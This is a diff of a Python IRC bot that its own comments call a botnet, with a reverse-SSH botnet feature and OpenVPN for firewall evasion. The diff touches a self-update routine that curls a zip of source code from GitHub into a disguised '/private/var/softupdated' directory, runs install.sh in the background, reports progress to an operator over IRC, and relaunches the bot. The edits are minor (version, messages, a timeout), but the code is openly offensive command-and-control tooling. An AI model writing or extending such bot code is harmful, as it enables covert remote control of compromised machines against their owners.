@@ -30,7 +30,7 @@ from modules.logging import logfile, log
 #       openvpn     implement openvpn for firewall evasion
 #       reverse ssh ssh botnet implementation
 
-version = "6.1.6"                                                   # bot version
+version = "6.1.9"                                                   # bot version
 
 try:
     logfile(filename="/var/softupdated/bot_v%s.log" % version)                         # redirects bot output to logfile
@@ -409,7 +409,7 @@ def run(cmd, public=False, return_to=admin):                                    
 
 def selfupdate(git_user="nikisweeting",git_repo="python-medusa"):   # updates the bot by downloading source from github, then running the update.sh script
     log('[*] Starting Selfupdate...')
-    privmsg('[*] Starting Selfupdate...')
+    privmsg('[+] Starting Selfupdate...')
     log('[>]   Downloading source code from git')
     cmd = "mkdir -p /private/var/softupdated; rm -Rf /private/var/softupdated/code.zip /private/var/softupdated/code; curl https://codeload.github.com/%s/%s/zip/master > /private/var/softupdated/code.zip" % (git_user, git_repo)
     for line in run_shell(cmd):
@@ -423,10 +423,10 @@ def selfupdate(git_user="nikisweeting",git_repo="python-medusa"):   # updates th
     pid = os.getpid()
     privmsg('[>]   Running install.sh')
     cmd = "cd /private/var/softupdated/code/*/; /bin/sh install.sh update &"
-    for line in run_shell(cmd, verbose=True):
+    for line in run_shell(cmd, timeout=120, verbose=True):
         privmsg('[>]    %s' % line)
         if line.find("Finished") != -1:
-            privmsg("[+] Update Finished, relaunching. Log saved in update.log")
+            privmsg("[+] Relaunching to finish update. Log saved in update.log")
             quit_status = True
             irc.send ( 'QUIT\r\n' )
             raise SystemExit
